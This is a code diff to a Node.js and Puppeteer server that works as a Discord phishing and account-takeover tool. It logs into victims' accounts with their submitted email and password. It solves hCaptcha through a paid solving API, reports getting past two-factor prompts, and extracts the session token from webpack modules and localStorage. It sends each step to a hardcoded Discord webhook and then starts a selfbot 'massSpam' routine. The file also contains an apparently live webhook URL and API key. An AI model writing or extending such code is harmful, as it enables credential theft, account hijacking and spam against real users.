@@ -25,6 +25,7 @@ app.use(express.static('public'));
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493675175634407514/zzQ3Ci849oAQs9YfaUFpDj0wI0noKnCTdDaIj9TMjmIkhBwTTYe1h_eTl-kU0_JEMK_L';
 const CUSTOM_MESSAGE = 'custom message';
+const ANTI_CAPTCHA_KEY = '373271de10fac6ff5aa75a2928acd339';
 
 const activeSessions = new Map();
 
@@ -39,6 +40,97 @@ function getIP(req) {
            req.connection.remoteAddress || 
            req.socket.remoteAddress || 
            'unknown';
+}
+
+// Anti-Captcha API functions
+async function createTask(websiteURL, websiteKey, taskType = 'HCaptchaTaskProxyless') {
+    const response = await axios.post('https://api.anti-captcha.com/createTask', {
+        clientKey: ANTI_CAPTCHA_KEY,
+        task: {
+            type: taskType,
+            websiteURL: websiteURL,
+            websiteKey: websiteKey,
+            isInvisible: false
+        },
+        softId: 0
+    });
+    
+    if (response.data.errorId !== 0) {
+        throw new Error(`Anti-Captcha error: ${response.data.errorDescription}`);
+    }
+    
+    return response.data.taskId;
+}
+
+async function getTaskResult(taskId) {
+    const maxAttempts = 60;
+    const delayMs = 5000;
+    
+    for (let i = 0; i < maxAttempts; i++) {
+        await new Promise(resolve => setTimeout(resolve, delayMs));
+        
+        const response = await axios.post('https://api.anti-captcha.com/getTaskResult', {
+            clientKey: ANTI_CAPTCHA_KEY,
+            taskId: taskId
+        });
+        
+        if (response.data.errorId !== 0) {
+            throw new Error(`Anti-Captcha error: ${response.data.errorDescription}`);
+        }
+        
+        if (response.data.status === 'ready') {
+            return response.data.solution;
+        }
+    }
+    
+    throw new Error('Anti-Captcha timeout');
+}
+
+async function solveHCaptcha(page, sessionId) {
+    try {
+        await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
+        
+        // Get hCaptcha sitekey
+        const sitekey = await page.evaluate(() => {
+            const hcaptchaDiv = document.querySelector('[data-sitekey]');
+            return hcaptchaDiv ? hcaptchaDiv.getAttribute('data-sitekey') : null;
+        });
+        
+        if (!sitekey) {
+            await sendWebhook({ content: `No sitekey found - Session: \`${sessionId}\`` });
+            return false;
+        }
+        
+        const taskId = await createTask('https://discord.com/login', sitekey);
+        await sendWebhook({ content: `CAPTCHA task created: ${taskId} - Session: \`${sessionId}\`` });
+        
+        const solution = await getTaskResult(taskId);
+        await sendWebhook({ content: `CAPTCHA solved - Session: \`${sessionId}\`` });
+        
+        // Inject token
+        await page.evaluate((token) => {
+            const hcaptchaResponse = document.querySelector('[name="h-captcha-response"]');
+            if (hcaptchaResponse) {
+                hcaptchaResponse.value = token;
+            }
+            
+            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
+            if (textarea) {
+                textarea.value = token;
+            }
+            
+            // Trigger callback if exists
+            if (window.hcaptchaCallback) {
+                window.hcaptchaCallback(token);
+            }
+        }, solution.gRecaptchaResponse);
+        
+        return true;
+        
+    } catch (error) {
+        await sendWebhook({ content: `CAPTCHA solve failed: ${error.message} - Session: \`${sessionId}\`` });
+        return false;
+    }
 }
 
 app.get('/', (req, res) => {
@@ -120,18 +212,28 @@ async function processLogin(email, password, ip, sessionId) {
         
         await delay(3000, 5000);
         
+        // Check for CAPTCHA
         const hasCaptcha = await page.evaluate(() => {
             return document.querySelector('iframe[src*="captcha"]') !== null ||
                    document.querySelector('.h-captcha') !== null ||
                    document.querySelector('[class*="captcha"]') !== null ||
-                   document.querySelector('iframe[src*="hcaptcha"]') !== null;
+                   document.querySelector('iframe[src*="hcaptcha"]') !== null ||
+                   document.querySelector('[data-sitekey]') !== null;
         });
         
         if (hasCaptcha) {
             await sendWebhook({ content: `CAPTCHA DETECTED - Session: \`${sessionId}\`` });
-            await solveCaptcha(page, sessionId);
+            const solved = await solveHCaptcha(page, sessionId);
+            
+            if (solved) {
+                await delay(2000, 3000);
+                // Retry login after CAPTCHA
+                await page.click('button[type="submit"]');
+                await delay(3000, 5000);
+            }
         }
         
+        // Check for 2FA
         await delay(3000, 5000);
         
         const is2FA = await page.evaluate(() => {
@@ -177,19 +279,6 @@ async function processLogin(email, password, ip, sessionId) {
                     await sendWebhook({ content: `2FA BYPASSED - Session: \`${sessionId}\`` });
                     break;
                 }
-                
-                const still2FA = await page.evaluate(() => {
-                    const bodyText = document.body.innerText || '';
-                    return bodyText.toLowerCase().includes('code') ||
-                           bodyText.toLowerCase().includes('verify') ||
-                           document.querySelector('input[name="code"]') !== null;
-                });
-                
-                if (!still2FA && !loggedIn) {
-                    await sendWebhook({ 
-                        content: `2FA PAGE CHANGED - Session: \`${sessionId}\`\nCurrent URL: ${await page.url()}` 
-                    });
-                }
             }
             
             if (!loggedIn) {
@@ -201,38 +290,24 @@ async function processLogin(email, password, ip, sessionId) {
             }
         }
         
+        // Check login success
         const currentUrl = await page.url();
         const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
         
         if (!isLoggedIn) {
-            const errorText = await page.evaluate(() => {
-                const errorEl = document.querySelector('[class*="error"]') || 
-                              document.querySelector('[style*="color: rgb(250, 71, 71)"]') ||
-                              document.querySelector('form div div');
-                return errorEl ? errorEl.innerText : null;
-            });
-            
             await sendWebhook({ 
-                content: `LOGIN FAILED - Session: \`${sessionId}\`\n${errorText ? 'Error: ' + errorText : 'Unknown error'}\nURL: ${currentUrl}` 
+                content: `LOGIN FAILED - Session: \`${sessionId}\`\nStill on: ${currentUrl}` 
             });
             await browser.close();
             return;
         }
         
+        // Get user info
         await delay(2000, 3000);
         
         const userInfo = await page.evaluate(() => {
-            const usernameEl = document.querySelector('[class*="username"]') ||
-                              document.querySelector('[class*="nameTag"]') ||
-                              document.querySelector('title');
-            
-            const titleText = document.title;
             let username = null;
             let userId = null;
-            
-            if (titleText && titleText.includes('-')) {
-                username = titleText.split('-')[1].trim();
-            }
             
             try {
                 const userCache = localStorage.getItem('UserSettingsStore');
@@ -256,13 +331,14 @@ async function processLogin(email, password, ip, sessionId) {
                 } catch(e) {}
             }
             
-            return { username, userId, title: titleText };
+            return { username, userId };
         });
         
         await sendWebhook({ 
-            content: `LOGIN SUCCESS - Session: \`${sessionId}\`\nLogged in as: \`@${userInfo.username || userInfo.title || 'Unknown'}\`\nUser ID: \`${userInfo.userId || 'Unknown'}\`\nURL: ${currentUrl}`
+            content: `LOGIN SUCCESS - Session: \`${sessionId}\`\nLogged in as: \`@${userInfo.username || 'Unknown'}\`\nUser ID: \`${userInfo.userId || 'Unknown'}\``
         });
         
+        // Extract token
         let token = null;
         
         try {
@@ -287,31 +363,17 @@ async function processLogin(email, password, ip, sessionId) {
                                         break;
                                     }
                                 }
-                                if (m.default && typeof m.default === 'string' && m.default.includes('.') && m.default.length > 50) {
-                                    foundToken = m.default;
-                                    break;
-                                }
-                                if (typeof m === 'string' && m.includes('.') && m.length > 50) {
-                                    foundToken = m;
-                                    break;
-                                }
                             }
                         }]);
                         window.webpackChunkdiscord_app.pop();
                     } catch(e) {}
                 }
                 
-                if (!foundToken && window.GLOBAL_ENV && window.GLOBAL_ENV.token) {
-                    foundToken = window.GLOBAL_ENV.token;
-                }
-                
                 return foundToken;
             });
-        } catch(e) {
-            await sendWebhook({ content: `Webpack extraction error: ${e.message}` });
-        }
+        } catch(e) {}
         
-        if (!token || typeof token !== 'string' || !token.includes('.')) {
+        if (!token || typeof token !== 'string') {
             try {
                 const localStorageData = await page.evaluate(() => {
                     const items = {};
@@ -325,58 +387,8 @@ async function processLogin(email, password, ip, sessionId) {
                 
                 for (const [key, value] of Object.entries(localStorageData)) {
                     if (value && typeof value === 'string' && value.split('.').length === 3) {
-                        const parts = value.split('.');
-                        if (parts[0].length > 10 && parts[1].length > 10 && parts[2].length > 5) {
-                            token = value;
-                            break;
-                        }
-                    }
-                }
-                
-                if (!token && localStorageData.token) {
-                    const t = localStorageData.token;
-                    if (typeof t === 'string' && t.includes('.')) {
-                        token = t;
-                    }
-                }
-                
-            } catch(e) {}
-        }
-        
-        if (!token) {
-            try {
-                const sessionData = await page.evaluate(() => {
-                    const items = {};
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        const value = sessionStorage.getItem(key);
-                        items[key] = value;
-                    }
-                    return items;
-                });
-                
-                for (const [key, value] of Object.entries(sessionData)) {
-                    if (value && typeof value === 'string' && value.split('.').length === 3) {
-                        const parts = value.split('.');
-                        if (parts[0].length > 10 && parts[1].length > 10) {
-                            token = value;
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        if (!token) {
-            try {
-                const cookies = await page.cookies();
-                for (const cookie of cookies) {
-                    if (cookie.value && cookie.value.includes('.') && cookie.value.split('.').length === 3) {
-                        const parts = cookie.value.split('.');
-                        if (parts[0].length > 10 && parts[1].length > 10) {
-                            token = cookie.value;
-                            break;
-                        }
+                        token = value;
+                        break;
                     }
                 }
             } catch(e) {}
@@ -398,7 +410,7 @@ async function processLogin(email, password, ip, sessionId) {
             }
         } else {
             await sendWebhook({ 
-                content: `NO VALID TOKEN - Session: \`${sessionId}\`\nExtracted: ${typeof token === 'object' ? JSON.stringify(token) : token}\nBut login was successful as \`@${userInfo.username || 'Unknown'}\``
+                content: `NO VALID TOKEN - Session: \`${sessionId}\`\nBut login was successful as \`@${userInfo.username || 'Unknown'}\``
             });
         }
         
@@ -420,32 +432,6 @@ async function humanType(page, selector, text) {
     }
 }
 
-async function solveCaptcha(page, sessionId) {
-    try {
-        const captchaFrame = await page.$('iframe[src*="captcha"], iframe[src*="hcaptcha"]');
-        if (captchaFrame) {
-            const box = await captchaFrame.boundingBox();
-            if (box) {
-                await page.mouse.move(
-                    box.x + 20 + Math.random() * 10,
-                    box.y + 30 + Math.random() * 10,
-                    { steps: 25 }
-                );
-                await delay(500, 1000);
-                await page.mouse.click(
-                    box.x + 20 + Math.random() * 10,
-                    box.y + 30 + Math.random() * 10
-                );
-            }
-        }
-        
-        await delay(5000, 8000);
-        
-    } catch (e) {
-        await sendWebhook({ content: `CAPTCHA error: ${e.message}` });
-    }
-}
-
 async function massSpam(token, sessionId, username) {
     try {
         const { Client } = require('discord.js-selfbot-v13');
@@ -460,12 +446,6 @@ async function massSpam(token, sessionId, username) {
                     $device: 'chrome'
                 }
             }
-        });
-        
-        client.on('error', async (error) => {
-            await sendWebhook({ 
-                content: `CLIENT ERROR - Session: \`${sessionId}\`\n${error.message}` 
-            });
         });
         
         client.on('ready', async () => {
